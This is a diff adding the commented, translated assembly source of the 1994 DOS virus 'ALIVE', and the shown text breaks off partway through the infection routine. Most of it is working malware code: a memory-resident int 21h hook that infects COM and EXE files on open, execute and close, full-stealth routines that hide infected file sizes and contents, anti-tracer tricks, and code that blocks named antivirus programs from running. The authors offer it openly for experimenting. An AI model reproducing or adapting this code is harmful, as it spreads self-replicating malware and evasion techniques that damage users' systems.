@@ -1,0 +1,3834 @@
+;============================================================================
+;
+;
+;
+;
+;
+;
+;                         THE  A˙L˙I˙V˙E  VIRUS
+;
+;
+;
+;
+;
+;
+;                 Code by SiRiUS & Friends 1994, Germany
+;
+;
+;
+;
+;
+;
+;
+;         80X86 assembly language / MS-DOS 6.20 operating system
+;
+;
+;
+;
+;
+;                                ---
+;
+;
+;
+;
+;                    German-to-english translation
+;                         by Neuroknight, 1995
+;
+;
+;============================================================================
+;
+;
+;
+;
+; Dear Reader!
+;
+;
+; Here we present the original, translated and fully commented source code of
+; one of those so called self-replicating programs.
+;
+;
+;
+; Technical review of ALIVE:
+;
+;  *) Memory resident, uses UMB, HIMEM (XMS) or conventional
+;
+;  *) Full-stealth mechanism
+;
+;  *) Polymorphic code decryptor (abbrev.)
+;
+;  *) Interrupt-tracing 21h and 2fh
+;
+;  *) Several retro techniques
+;
+;  *) Memory "stealth" / windowing-technique
+;
+;  *) System-File-Table support ( SFT )
+;
+;  *) 286-Instructions
+;
+;  *) Interesting generation-counters
+;
+;  *) No implied destruction of data
+;
+;
+;                                ---
+;
+;
+;  PROGRAMMER's NOTES:
+; ---------------------
+;
+;  The Alive source is not perfect, it contains some bugs, which we
+;  know of. Especially in the SPM-engine-part about one half of the code
+;  has been deleted and alot was commented out. Since we do not have the
+;  desire to make the world's best poly-engine, plz dont measure it with
+;  Uruguays or others. If you like experimenting, you may reinsert the
+;  commented parts, write your own or erase a lot of garbage, have fun!
+;  Some parts of the code are programmed really inconsistently, surely
+;  you will find them, like the residency part although full-stealth
+;  seems to work fine.
+;
+;  Alive does not infect L*.* files, so if you rename your substantial
+;  system/compiler-executables, you can experiment without being afraid
+;  of any uncontrolled actions.
+;
+;
+;  If you execute any Alive-infected file with the parameter AL (upper case),
+;  you will get information about the infection status, date of infection
+;  and some other interesting things, which allow tracing of the infection
+;  chain in a corrupted system.
+;
+;  This info will look like:
+;
+; ----start----
+;
+;       <-<<<  ALiVE  >>>->  Programmed by SiRiUS, Germany 1994"
+;
+;       FiRST NAME      [000000]
+;       LAST NAME       [000000]
+;       BiRTHDAY        [00-00-00 00:00]
+;       HEiR            [0000]
+;       SUM             [0000]
+;       GENERATION      [0000]
+;
+; ----end------
+;
+;  Find out what the various counters mean !
+;
+;
+;  Alive contains an uninstall-function which allows you to remove
+;  the virus from memory, when it is resident.
+;  You only have to execute:
+;
+;       mov     ax,AskIfResident_AX
+;       mov     si,AskIfResident_SI
+;       mov     di,AskIfResident_DI
+;       mov     bp,DeinstallDemand_BP
+;       int     21h
+;
+;  This code will unhook the interrupt and free the memory used by
+;  Alive if possible.
+;
+;
+;
+;                                ---
+;
+;
+;  Nk greets (in a random order): Sirius, Mindmaniac, Tron, Mephisto,
+;  Metal Junkie, Priest, Metabolis, King Dan, Horde, Qark, Onkel D.,
+;  Marky, TuIr, Exxon, ALAI-providers, DA-BBS/Omega, Tron-BBS, nb,
+;  Spiritual-Reality-BBS, someone from Germany who does not want to be
+;  mentioned and YOU!
+;
+;
+;
+;
+;  Compilation:
+; --------------
+;               1. TASM  <file> /m6
+;               2. TLINK <file> /x /t
+;
+;
+;
+;
+;
+;  If you have any comments or serious bug-reports, don't hesistate to send
+;  us an e-mail or contact us on #virus on IRC (we prefer that you ask our
+;  friend NK first).
+;
+;
+;
+;
+;  DO NOT SEND e-MONEY!
+;
+;
+;
+;
+;
+;============================================================================
+
+
+
+
+; Here are some flags where 0 means NO, 1 means YES:
+
+
+FL_Infection_Close  equ 1       ; Infect on closing ?
+
+FL_Anti_Tracer      equ 1       ; Deinstall tracers ?
+
+FL_Inf_Break        equ 1       ; Wait time betw. infections ?
+
+FL_Random_Fill      equ 1       ; Pad ?
+
+FL_SVS_Res_Check    equ 1       ; Skip installing if TSR found ?
+
+FL_Sleep            equ 1       ; Wait time betw. installation and the first
+                                ; infection ?
+
+
+;==[ include file: STRUCT.ASM ]==============================================
+
+Ofs             equ     Offset          ;clever!
+Cmt             equ     Comment
+
+Directory       STRUC
+DS_Drive        db ?
+DS_File_Name    db 8 dup(0)
+DS_File_Ext     db 3 dup(0)
+DS_File_Attr    db ?
+DS_Reserved     db 10 dup(0)
+DS_Time         dw ?
+DS_Date         dw ?
+DS_Start_Clust  dw ?
+DS_File_Size    dd ?
+Directory       ENDS
+
+FCB             STRUC
+FCB_Drive       db ?
+FCB_File_Name   db 8 dup(0)
+FCB_File_Ext    db 3 dup(0)
+FCB_Block       dw ?
+FCB_Rec_Size    dw ?
+FCB_File_Size   dd ?
+FCB_File_Date   dw ?
+FCB_File_Time   dw ?
+FCB_Reserved    db 8 dup(0)
+FCB_Record      db ?
+FCB_Random      dd ?
+FCB             ENDS
+
+DTA             STRUC
+DTA_Reserved    db 21 dup(0)
+DTA_File_Attr   db ?
+DTA_File_Time1  db ?                    ; = seconds
+DTA_File_Time2  db ?
+DTA_File_Date   dw ?
+DTA_File_Size   dd ?
+DTA_File_Name   db 13 dup(0)
+DTA             ENDS
+
+SFT             STRUC
+SFT_Reserved1   dw ?    ; 0
+SFT_Open_Mode   dw ?    ; 2
+SFT_File_Attr   db ?    ; 4
+SFT_Reserved2   dw ?    ; 5
+SFT_Reserved3   dd ?    ; 7
+SFT_Reserved4   dw ?    ; 11
+SFT_File_Time   dw ?    ; 13
+SFT_File_Date   dw ?    ; 15
+SFT_File_SizeLo dw ?    ; 17
+SFT_File_SizeHi dw ?    ; 19
+SFT_Curr_OfsLo  dw ?    ; 21
+SFT_Curr_OfsHi  dw ?    ; 23
+SFT_Reserved7   dw ?    ; 25
+SFT_Reserved8   dd ?    ; 27
+SFT_Reserved9   db ?    ; 31
+SFT_File_Name   db 8 dup(?)     ; 32 = 20h
+SFT_File_Ext    db 3 dup(?)     ; 40 = 28h
+SFT             ENDS
+
+ExeH            STRUC
+Buf_0h          dw 0    ; "MZ" oder "ZM" (selten)
+Buf_2h          dw 0    ; Last page size
+Buf_4h          dw 0    ; Size in pages
+Buf_6h          dw 0
+Buf_8h          dw 0
+Buf_ah          dw 0
+Buf_ch          dw 0
+Buf_eh          dw 0    ; SS
+Buf_10h         dw 0    ; SP
+Buf_12h         dw 0    ; CheckSum
+Buf_14h         dw 0    ; IP
+Buf_16h         dw 0    ; CS
+Buf_18h         dw 0    ; WINDOWS Marker
+ExeH            ENDS
+
+;=======================================[ end of include file: STRUCT.ASM ]==
+
+
+
+; Constants follow:
+
+
+modActive       = 0
+modTransparent  = 1
+
+Allocated_None  = 'N'
+Allocated_UMB   = 'U'
+
+File_Mark_COM   = 0
+File_Mark_EXE   = byte (Exit_Exe-FileType_Byte)-2
+
+Time_ID         = 21                                    ; infection marker
+HeaderLength    = 1ah
+Nominal_VLength = 4608                                  ; virus length                              ; Virus length
+Body_VLength    = End_Enc_Code - Encrypted_Code
+Reserve_Mem     = ((2*Nominal_VLength)+256) shr 4
+
+
+
+; Conditions of files to not infect:
+
+
+F_Min_LengthCOM = 5000
+F_Max_LengthCOM = 60000
+F_Min_LengthEXE = 12            ; = ca. 6 kB
+F_Max_LengthEXE = 2000          ; = ca. 1000 kB
+
+SpareTime       = 1     ;18     ; Wait this intervall betw. infections if
+                                ; flag above set (in 1/18.2 sec)
+
+SleepIntervall  = 1     ;182    ; Activate after installation (in 1/18.2 sec)
+
+; Are-you-there function-calls:
+
+AskIfResident_AX    = 3000h
+AskIfResident_SI    = 1000h
+AskIfResident_DI    = 1414h
+YesResident_SI      = 1732h
+YesResident_DI      = 2000h
+DeinstallDemand_BP  = 2236h
+
+        .286
+Code    Segment
+        Assume  cs:code,ds:code,ss:code,es:code
+        Org     100h
+
+Sample: jmp     SHORT Encrypted_Code
+        nop
+
+Encrypted_Code:
+        cld
+        call    Continue
+Delta   equ     $
+
+Continue:
+
+; Find delta-offset to relocate code
+        pop     bp
+        sub     bp,ofs Delta
+
+        push    Rout_DisplayCopyright
+        call    Use_Routine
+
+IF FL_SVS_Res_Check
+        mov     dx,'VS'         ; MCB-Scan for "SV" (SVS)
+        push    Rout_ScanMCB
+        call    Use_Routine
+        jz      Exit_Program    ; Do not install if SVS found !
+        mov     dx,'EN'         ; MCB-Scan for "NE" (NEMESIS)
+        push    Rout_ScanMCB
+        call    Use_Routine
+        jz      Exit_Program    ; Do not install if NEMESIS found !
+ENDIF
+
+; Check if virus already installed, install if not!
+        mov     ax,AskIfResident_AX
+        mov     si,AskIfResident_SI
+        mov     di,AskIfResident_DI
+        int     21h
+        cmp     si,YesResident_SI
+        jnz     Install
+        cmp     di,YesResident_DI
+        jz      Exit_Program
+
+Install:
+
+; Find original int-EPs and patch some AV-TSRs
+        push    Rout_Trace_Interrupts
+        call    Use_Routine
+
+        call    Memory_Installation
+
+Exit_Program:
+              db     0EBh                    ; = JMP-opcode
+FileType_Byte db     File_Mark_COM
+
+
+Exit_Com:
+        lea     si,[bp+Old_ExeValues]
+        mov     di,100h                 ; Double function !!
+        push    di
+        movsw
+        movsb
+
+ZeroRegsForHost:
+        mov     cx,8
+nullup: push    0
+        loop    nullup
+        popa
+        ret
+
+Exit_Exe:
+        mov     ax,ds                           ; DS = PSP !
+        add     ax,10h                          ; + 100h bytes of PSP
+        add     cs:[bp+Old_CS],ax               ; = new CS
+        add     ax,0000                         ; + old SS
+        org     $-2
+Old_SS  dw      ?
+        cli
+        mov     ss,ax                           ; set SS
+        mov     sp,0000                         ; set SP
+        org     $-2
+Old_SP  dw      ?
+        sti
+        call    ZeroRegsForHost
+
+        db      0EAh                            ; = JMP Old_CS:Old_IP
+
+; In an EXE - header-values are stored here,
+; in a COM - first 3 bytes are saved here
+
+Old_ExeValues:
+Old_IP          dw      20cdh
+Old_CS          dw      0
+
+
+
+;============================================================================
+; This calls the _vector-table_ interrupt handler
+;============================================================================
+INT21 proc near
+        pushf
+        call    dword ptr cs:[OldInt21_Ofs]
+        ret
+INT21 endp
+
+
+;============================================================================
+; This calls the _traced_ DOS-Kernel 21 interrupt handler
+;============================================================================
+tINT21 proc near
+        pushf
+        db                      9Ah
+        TracedInt21_Ofs dw      ?
+        TracedInt21_Seg dw      ?
+        ret
+tINT21 endp
+
+
+;============================================================================
+; This calls the _traced_ DOS-Kernel 2F interrupt handler
+;============================================================================
+tINT2F proc near
+        pushf
+        db                      9Ah
+        TracedInt2F_Ofs dw      ?
+        TracedInt2F_Seg dw      ?
+        ret
+tINT2F endp
+
+
+;============================================================================
+; Neue InterruptRoutine
+;============================================================================
+NewInt_21:
+        nop
+        nop
+        pushf
+
+; Check if WINDOWS is active by checking the VGA-graphics mode
+        pusha
+        push    ds
+        push    0
+        pop     ds
+        mov     al,byte ptr ds:[0449h]  ;==Int10/AH=0fh
+        pop     ds
+        cmp     al,3                    ;== text-modes
+        jbe     VGA_Mode_Ok
+        cmp     al,7                    ;== text-mode
+        je      VGA_Mode_Ok
+        popa
+        jmp     SkipVirusActivity       ;graphics being displayed (e.g. WIN)
+VGA_Mode_Ok:
+        popa
+
+;--------------------------
+
+IF FL_ANTI_TRACER
+; SpÅrt Interrupt-Tracer auf und leitet sie um
+        push    bp
+        cli
+        push    64h
+        mov     bp,sp
+        inc     sp
+        inc     sp
+        cmp     byte ptr ss:[bp],0064h
+        sti
+        pop     bp
+        je      no_Tracer
+        popf
+        iret
+
+no_Tracer:
+ENDIF
+        cmp     cs:VirModus,modTransparent
+        jnz     not_Transparent
+        jmp     SkipVirusActivity
+not_Transparent:
+
+IF FL_SLEEP
+; Virus 'sleeps' for a time after installation
+        push    ds
+        pushf
+        push    0                ; doubleword at 0:46c
+        pop     ds
+        cmp     word ptr ds:[46ch+2],1111h
+        org     $-2
+Slp_Hi  dw      ?
+        ja      enough_sleeping
+        jb      keep_sleeping
+        cmp     word ptr ds:[46ch]  ,2222h
+        org     $-2
+Slp_Lo  dw      ?
+        ja      enough_sleeping
+
+keep_sleeping:
+        popf
+        pop     ds
+        jmp     SkipInfectionRoutines
+
+enough_sleeping:
+        popf
+        pop     ds
+ENDIF
+
+;=================== Infection procedures start here ========================
+
+IF FL_INFECTION_CLOSE
+        cmp     ah,3eh                  ; CLOSE function, Infect on closing
+        jnz     not_Infect_On_Closing
+        jmp     Infect_On_Closing
+
+not_Infect_On_Closing:
+ENDIF
+        cmp     ah,3dh                  ; OPEN function
+        jnz     not_Open
+        jmp     Infect_Standard
+
+not_Open:
+        cmp     ax,4b00h                ; EXEC function (skip overlays etc..)
+        jnz     not_Execute
+        jmp     Infect_Standard
+
+not_Execute:
+        cmp     ah,40h
+        jnz     Not_WriteToHandle
+        cmp     bl,4
+        ja      wth_ok
+        jmp     False_Function
+wth_ok:
+        push    Rout_WriteToHandle
+        call    Use_Routine
+        jmp     False_Function
+
+Not_WriteToHandle:
+        cmp     ah,43h                  ; GET/SET ATTRIBUTE function
+        jnz     not_GetSetAttrib
+        jmp     Infect_Standard
+not_GetSetAttrib:
+
+SkipInfectionRoutines:
+
+;=================== Stealth procedures start here ==========================
+
+; Check out if stealth should be disabled
+        push    Rout_TestIfDoStealth
+        call    Use_Routine
+        jz      SkipVirusActivity
+
+        cmp     ah,3fh
+        jnz     not_ReadFromHandle
+
+        popf
+        push    Rout_ReadFromHandle
+        call    Use_Routine
+        retf    2
+
+not_ReadFromHandle:
+        cmp     ax,4202h
+        jnz     not_SeekToEOF
+
+        popf
+        push    Rout_SeekToEOF
+        call    Use_Routine
+        retf    2
+
+not_SeekToEOF:
+        cmp     ah,57h
+        jnz     not_GetSetHandleDateTime
+
+        popf
+        push    Rout_GetSetHandleDateTime
+        call    Use_Routine
+        retf    2
+
+
+not_GetSetHandleDateTime:
+        cmp     ah,11h                  ; DIR (fcb) function
+        jb      not_DosDir
+        cmp     ah,12h                  ; DIR (fcb) function
+        ja      not_DosDir
+
+        popf
+        push    Rout_DosDir
+        call    Use_Routine
+        retf    2
+
+not_DosDir:
+        cmp     ah,4eh                  ; FIND FIRST dir/file function
+        jb      not_DosFindFile
+        cmp     ah,4fh                  ; FIND NEXT dir/file function
+        ja      not_DosFindFile
+
+        popf
+        push    Rout_DosFindFile
+        call    Use_Routine
+        retf    2
+
+not_DosFindFile:
+        jmp     SkipVirusActivity
+
+SkipVirusActivity:
+        cmp     ax,AskIfResident_AX     ; Are-You-There-Test ?
+        jne     False_Function
+
+        cmp     si,AskIfResident_SI
+        jne     False_Function
+        cmp     di,AskIfResident_DI
+        jne     False_Function
+
+        cmp     bp,DeinstallDemand_BP   ; Demand to deinstall virus
+        je      Deinstall
+        mov     si,YesResident_SI
+        mov     di,YesResident_DI
+        popf
+        iret
+
+Deinstall:
+        push    0
+        pop     ds
+        cli
+        mov     ax,cs:OldInt21_Ofs
+        mov     ds:[21h*4],ax
+        mov     ax,cs:OldInt21_Seg
+        mov     ds:[21h*4+2],ax
+        sti
+        mov     ah,49h          ; release memory
+        push    cs
+        pop     es
+        int     21h
+
+        popf
+        iret
+
+False_Function:
+        popf
+
+; The following compiles as: JMP FAR Old_Int21_ES:Old_Int21_BX
+                db      0EAh
+OldInt21_Ofs    dw      0
+OldInt21_Seg    dw      0
+;----------------------------------------------------------------------------
+
+
+;============================================================================
+; Infects at closing
+;============================================================================
+Infect_On_Closing:
+        cmp     bl,4
+        jbe     False_Function
+        pusha
+        push    ds es
+        push    cs
+        pop     ds
+        mov     Handle,bx
+
+        mov     Flag_InfectClose,1
+        call    CloseInfection_EP
+        mov     cs:Flag_InfectClose,0
+
+        mov     cs:Handle,-1
+        pop     es ds
+        popa
+        jmp     short False_Function
+
+
+;============================================================================
+; Disinfects file which is written to (AH=40h)
+;============================================================================
+WriteToHandle PROC NEAR
+        pusha
+        push    ds es
+
+        push    cs
+        pop     ds
+        mov     Handle,bx
+
+        push    Rout_Get_SFT
+        call    Use_Routine
+
+        lea     si,es:[di.SFT_File_Ext]         ; executable ?
+        push    es
+        pop     ds
+        push    Rout_CheckExtensionForExec
+        call    Use_Routine
+        jnz     wth_notdisinfect                ; exit
+
+        push    cs
+        pop     ds
+
+        mov     ax,5700h                ; get stamp
+        call    tINT21
+        mov     al,cl
+        and     al,00011111b
+        cmp     al,Time_ID
+        jne     wth_notdisinfect        ; not infected..
+        push    cx dx                   ; save stamps
+
+        mov     ax,4201h                ; save file-pointer position
+        xor     cx,cx
+        cwd
+        call    tInt21                  ; Get current FilePosition to DX:AX
+        push    dx ax
+
+        mov     ax,4202h                ; seek EOF - saved header
+        mov     cx,-1
+        mov     dx,-HeaderLength
+        call    tINT21
+
+        mov     ah,3fh                  ; read saved header bytes
+        mov     cx,HeaderLength
+        mov     dx,ofs Buffer
+        call    tINT21
+
+        mov     ax,4200h                ; seek TOF
+        xor     cx,cx
+        cwd
+        call    tINT21
+
+        mov     ah,40h                  ; write orig header
+        mov     cx,HeaderLength
+        mov     dx,ofs Buffer
+        call    tINT21
+
+        mov     ax,4202h                ; seek EOF - vir
+        mov     cx,-1
+        mov     dx,-Nominal_VLength     ; NEG'd
+        call    tINT21
+
+        mov     ah,40h                  ; truncate file
+        xor     cx,cx
+        call    tINT21
+
+        mov     ax,4200h           ; Restore FilePointer position to CX:DX
+        pop     dx cx
+        call    tInt21
+
+        mov     ax,5701h
+        pop     dx cx                   ; restore stamps
+        and     cl,11100000b            ; mark uninfected
+        call    tINT21
+
+wth_notdisinfect:
+        pop     es ds
+        popa
+        ret
+WriteToHandle ENDP
+WriteToHandle_end equ $
+;----------------------------------------------------------------------------
+
+
+;============================================================================
+; Falsifies the DOS's FCB functions 11h and 12h
+;============================================================================
+DosDir proc near
+        call    tINT21
+        pusha
+        push    ds es
+        pushf
+
+        cmp     al,0                    ; AL=0 == file match found
+        jnz     noFilesFound
+
+
+; This overcomes the well known CHKDSK error
+        mov     ah,51h                  ; Get PSP to BX
+        call    tINT21
+        mov     ds,bx
+        mov     ax,ds:[10h]
+        dec     ax
+        mov     ds,ax
+        cmp     ds:[13],'DN'            ; COMMA_ND_.COM ?
+        jne     noFilesFound
+
+        mov     ah,2fh                  ; get DTA to ES:BX
+        call    tINT21
+        push    es
+        pop     ds
+
+        cmp     byte ptr ds:[bx],-1     ; extended FCB ?
+        jnz     stdFCB
+        add     bx,7
+
+stdFCB: mov     al,byte ptr ds:[bx+23]
+        and     al,00011111b
+        cmp     al,Time_ID              ; File infected ?
+        jnz     noFilesFound
+
+        and     byte ptr ds:[bx+23],11100000b
+
+        cmp     word ptr ds:[bx+29],Nominal_VLength
+        jae     DosDir_lenOK
+        cmp     word ptr ds:[bx+31],0
+        jz      noFilesFound
+
+DosDir_lenOK:
+        sub     word ptr ds:[bx+29],Nominal_VLength
+        sbb     word ptr ds:[bx+31],0
+
+noFilesFound:
+        popf
+        pop     es ds
+        popa
+        ret
+DosDir endp
+DosDir_End      equ     $
+
+
+;============================================================================
+; Falsifies the DOS's HANDLE functions 4eh and 4fh
+;============================================================================
+DosFindFile proc near
+        call    tINT21
+        pusha
+        push    ds es
+        pushf
+        jc      findError
+
+        mov     ah,2fh                          ;=> ES:BX = address of DTA
+        call    tINT21
+        push    es
+        pop     ds
+
+        mov     al,ds:[bx.DTA_File_Time1]       ; Seconds
+        and     al,00011111b
+        cmp     al,Time_ID                      ; File infected ?
+        jnz     findError
+
+        and     ds:[bx.DTA_File_Time1],11100000b
+
+        cmp     word ptr ds:[bx.DTA_File_Size],Nominal_VLength
+        jae     DosFind_lenOK
+        cmp     word ptr ds:[bx.DTA_File_Size+2],0
+        jz      findError
+
+DosFind_lenOK:
+        sub     word ptr ds:[bx.DTA_File_Size],Nominal_VLength
+        sbb     word ptr ds:[bx.DTA_File_Size+2],0
+
+findError:
+        popf
+        pop     es ds
+        popa
+        ret
+DosFindFile endp
+DosFindFile_End equ $
+
+
+;============================================================================
+; If current process is one of conditions then skip the stealth features
+;  positive --> ZF,  else --> NZ
+;============================================================================
+TestIfDoStealth PROC NEAR
+        pusha
+        push    ds
+
+        mov     ah,51h
+        call    tint21
+        dec     bx
+        mov     ds,bx
+        mov     si,8
+
+        cmp     ds:[si],'KP'     ; PKZIP
+        jz      ArchiverFound
+        cmp     ds:[si],'RA'     ; ARJ
+        jz      ArchiverFound
+        cmp     ds:[si],'UU'     ; UUENCODE
+        jz      ArchiverFound
+        cmp     ds:[si],'AB'     ; BACKUP
+        jz      ArchiverFound
+        cmp     ds:[si],'HL'     ; LHA
+        jz      ArchiverFound
+        cmp     ds:[si],'OM'     ; MODEM
+
+ArchiverFound:
+        pop     ds
+        popa
+        ret
+TestIfDoStealth ENDP
+TestIfDoStealth_End equ $
+
+;============================================================================
+; Ever proceed a seek to (EOF-virusbody) on infected files
+;============================================================================
+SeekToEOF PROC NEAR
+        pushf
+        pusha
+        mov     ax,5700h          ; Is File infected ?
+        call    tInt21
+        and     cl,00011111b
+        cmp     cl,Time_ID
+        popa
+        jnz     @sauber            ; Not infected --> Exit stealth routine
+
+        push    cx
+        or      cx,dx              ; EOF ?
+        pop     cx
+        jnz     @sauber
+
+        mov     cx,-1
+        mov     dx,-Nominal_VLength
+
+@sauber:
+        popf
+
+        call    Int21
+        ret
+SeekToEOF ENDP
+SeekToEOF_End equ $
+
+
+;============================================================================
+; Dont allow to get (Time_ID) secs on infected files and to set (Time_ID)
+; seconds on clean files
+;============================================================================
+GetSetHandleDateTime PROC NEAR
+        push    cx
+        and     cl,00011111b    ; Query to change seconds field to TimeID ?
+        cmp     cl,Time_ID
+        pop     cx
+        jnz     NotChangeSecs
+        and     cl,11100000b    ; Mark as not infected if so  (set to 0)
+NotChangeSecs:
+        call    tInt21
+;--
+        pushf
+        push    cx
+        and     cl,00011111b    ; got TimeID secs ?
+        cmp     cl,Time_ID
+        pop     cx
+        jnz     NotGotSecs
+        and     cl,11100000b    ; Mark as not infected if so  (give 0)
+NotGotSecs:
+        popf
+;--
+        ret
+GetSetHandleDateTime ENDP
+GetSetHandleDateTime_End equ $
+
+
+;============================================================================
+; Full-stealth (Fileread) mechanism
+; Metal-Junkie: here it is!, convince yourself! (nk)
+;============================================================================
+ReadFromHandle PROC NEAR
+        mov     cs:BufferSeg,ds
+        mov     cs:BufferOfs,dx
+
+        call    tInt21
+
+        pusha
+        push    ds es
+        pushf
+
+        push    cs                      ; Assume DS:=CS (Save space)
+        pop     ds
+
+        mov     BytesRead,ax
+
+        jnc     @rfh1
+@Error: jmp     ReadError
+@rfh1:
+        mov     ax,5700h                ; Is File infected ?
+        call    tInt21
+        and     cl,00011111b
+        cmp     cl,Time_ID
+        jne     @Error              ; Not infected --> Exit stealth routine
+
+        mov     ax,4201h                ; Get current FilePosition to DX:AX
+        xor     cx,cx
+        cwd
+        call    tint21
+        jc      @Error
+
+        sub     ax,BytesRead        ; Current file position - Bytesread is
+        sbb     dx,0                ; the pre-read file position in DX:AX
+        mov     PreReadPosHi,dx
+        mov     PreReadPosLo,ax
+
+        mov     ax,4202h            ; Get infected file size to DX:AX
+        xor     cx,cx
+        cwd
+        call    tint21
+
+        sub     ax,Nominal_VLength  ; Sutract VirusSize and get CarrierSize
+        sbb     dx,0                ; in DX:AX
+        mov     CarrierSizeLo,ax
+        mov     CarrierSizeHi,dx
+
+;============================================================================
+; Decide if read was made from the header
+;============================================================================
+
+        mov     AX,PreReadPosHi
+        mov     dx,PreReadPosLo         ; AX:DX = pre-read file ptr position
+        or      AX,AX
+        jnz     NotInHeader             ; Not 0 means FilePosition >= 64 kB
+        cmp     dx,HeaderLength
+        jae     NotInHeader             ; Not reading from header area
+
+; Map Header contents
+        sub     dx,HeaderLength         ; Get count bytes to map to DX
+        neg     dx
+
+; DX must be smaller than ReadBytes, else map 'Readbytes' bytes
+        mov     AX,BytesRead
+        cmp     dx,ax
+        ja      ShortReadInHeader       ; If there are bytes read in header
+        mov     AX,dx                   ; area only
+ShortReadInHeader:
+        push    AX                      ; = Number of bytes to map
+
+; Read original header, which is located
+; at the end of file (last few bytes)
+
+; Go to proper file position (02 subfunction call requires NEGated values)
+        mov     ax,4202h
+        mov     cx,-1
+        mov     dx,-HeaderLength
+        call    tInt21
+
+; Read from file
+        mov     ah,3fh                  ; Read to buffer at DS(=CS):DX
+        mov     dx,offset StealthBuffer
+        mov     cx,HeaderLength
+        call    tInt21
+
+; Map original bytes into the buffer
+        pop     cx                      ; = Number of bytes to map
+        mov     si,offset StealthBuffer
+        mov     es,BufferSeg
+        mov     di,BufferOfs
+        cld
+        rep     movsb
+
+NotInHeader:
+; Decide if we are reading in(to) the virus body
+        mov     cx,PreReadPosHi
+        mov     AX,PreReadPosLo           ; CX:ax = OrigPos
+        add     AX,BytesRead
+        adc     cx,0                      ; CX:AX = OrigPos + Read
+
+; No stealth if ( Carrier >= (OrigPos+Read) )
+        cmp     cx,CarrierSizeHi
+        jb      NoStealth               ; if CarrierHi bigger => no stealth!
+        ja      Stealth                 ; if CarrierHi smaller => do stealth!
+        cmp     AX,CarrierSizeLo        ; if hi-words equal => check lo-words!
+        jbe     NoStealth               ; if Carrier bigger/equal =>
+
+Stealth:
+
+; Decide if to map out the whole
+; read-buffer or a part only
+
+        mov     cx,CarrierSizeHi
+        mov     AX,CarrierSizeLo                ; CX:AX = Carrier
+
+; Map out whole area if (OriginPos >= Carrier)
+        cmp     cx,PreReadPosHi                 ; If OrigHi bigger => whole
+        jb      DoStealthInWholeReadArea
+        ja      PartStealth
+        cmp     AX,PreReadPosLo
+        ja      PartStealth
+
+DoStealthInWholeReadArea:
+        mov     BytesRead,0
+        jmp     SHORT StealthDone
+
+PartStealth:
+        mov     AX,CarrierSizeLo        ; CX:AX = Carrier
+        sub     AX,PreReadPosLo         ; CX(=0):AX = Carrier - OrigPos
+        mov     BytesRead,AX            ; Do stealth in part of read area
+
+StealthDone:
+NoStealth:
+        mov     ax,4200h                ; Restore FilePointer position
+        mov     cx,PreReadPosHi         ; CX:DX
+        mov     dx,PreReadPosLo
+        add     dx,BytesRead
+        adc     cx,0
+        call    tInt21
+
+ReadError:
+        popf
+        pop     es ds
+        popa
+        mov     ax,cs:BytesRead
+        ret
+ReadFromHandle ENDP
+ReadFromHandle_End equ $
+;----------------------------------------------------------------------------
+
+
+;============================================================================
+; Infect file which name is at @DS:DX
+;============================================================================
+Infect_Standard PROC NEAR
+        mov     cs:HookedFunction,ah
+        pusha
+
+; Check if file-name to run/open is EXE or COM !
+        mov     si,dx
+NextChar:
+        lodsb
+        cmp     al,0
+        jz      BadExt
+        cmp     al,'.'
+        jnz     NextChar
+
+        push    Rout_CheckExtensionForExec
+        call    Use_Routine
+
+        jnz     BadExt
+        popa
+;---
+        call    Infection
+;---
+        cmp     cs:AttackAV,1
+        jnz     goto_FalseFunction
+        xor     dx,dx                   ; Produce execution-error!
+        mov     cs:AttackAV,0
+        jmp     goto_FalseFunction
+
+BadExt: popa
+
+goto_FalseFunction:
+        jmp     False_Function
+
+Infect_Standard ENDP
+Infect_Standard_End equ $
+
+
+;============================================================================
+; Infects a COM/EXE Datei (mechanism)
+;============================================================================
+Infection proc near
+        pusha
+        push    ds es
+
+        mov     cs:NameDX,dx
+        mov     cs:NameDS,ds
+        push    dx
+
+; Open file with Read/Only access
+        mov     AX,3D00h
+        lds     dx,dword ptr cs:NamePtr
+        call    tINT21
+        push    CS
+        pop     DS
+        push    cs
+        pop     es
+        jnc     OpenedCorrectly
+@goto_Leave:
+        jmp     Need_To_Leave
+
+OpenedCorrectly:
+        mov     cs:Handle,ax                ; Save handle
+        xchg    ax,bx              
+
+;========================================================
+; Entry Point of the Close-infection ( its clever NB !)
+;========================================================
+CloseInfection_EP:
+
+; Laufwerke A: und B: werden umgangen
+        mov     ax,4400h
+        call    tINT21
+        and     dl,20h+10h+8+4+2+1  ; bits 0-5 = Lw.
+        mov     cs:DriveNr,dl
+        cmp     dl,2
+        jae     IsHarddisk
+        jmp     Leave_And_Close
+
+IsHarddisk:
+        push    Rout_Get_SFT
+        call    Use_Routine
+
+; Do not infect all L*.* files / for testing purposes
+        cmp     Byte Ptr es:[di.SFT_File_Name],'L'
+        jz      goto_CloseLeave
+        cmp     Word Ptr es:[di.SFT_File_Name],'VS'     ; "SVS" ?
+        jnz     not_SVS_executed
+        mov     cs:VirModus,modTransparent
+        jmp     Leave_And_Close
+
+not_SVS_executed:
+
+; Check if COM or EXE File:
+        lea     si,es:[di.SFT_File_Ext]
+        push    es
+        pop     ds
+
+        push    Rout_CheckExtensionForExec
+        call    Use_Routine
+
+        push    cs
+        pop     ds
+        jnz     goto_CloseLeave
+
+;============================================================================
+;  Check if filename is an AV-Product !
+;============================================================================
+; AV-Gruppe "Ignore":
+        mov     cx,(AV_Table_Ignore_End-AV_Table_Ignore) /2
+        mov     si,ofs AV_Table_Ignore
+Next_AV:
+        lodsw
+        cmp     Word Ptr es:[di.SFT_File_Name],ax
+        jz      goto_CloseLeave
+        loop    Next_AV
+
+; Second check if filename is an AV-Product !
+
+; AV-Gruppe "Attack":
+        mov     cx,(AV_Table_Attack_End-AV_Table_Attack) /2
+        mov     si,ofs AV_Table_Attack
+Next_AV_2:
+        lodsw
+        cmp     Word Ptr es:[di.SFT_File_Name],ax
+        jz      ProgToAttackFound
+No_Attack:
+        loop    Next_AV_2
+
+; Check if infected
+        mov     ax,es:[di.SFT_File_Time]
+        and     al,00011111b
+        cmp     al,Time_ID
+        jnz     Time_OK
+
+goto_CloseLeave:
+        jmp     Leave_And_Close
+
+ProgToAttackFound:
+        cmp     cs:HookedFunction,4bh
+        jnz     goto_CloseLeave
+        mov     cs:AttackAV,1
+        jmp     SHORT goto_CloseLeave
+
+Time_OK:
+
+; Force read/write mode
+        mov     word ptr es:[di.SFT_Open_Mode],2
+; Datum/Zeit sichern
+        mov     ax,es:[di.SFT_File_Time]
+        mov     Old_Time,ax              
+        mov     ax,es:[di.SFT_File_Date]
+        mov     Old_Date,ax
+; Save and clear attributes
+        mov     al,es:[di.SFT_File_Attr]
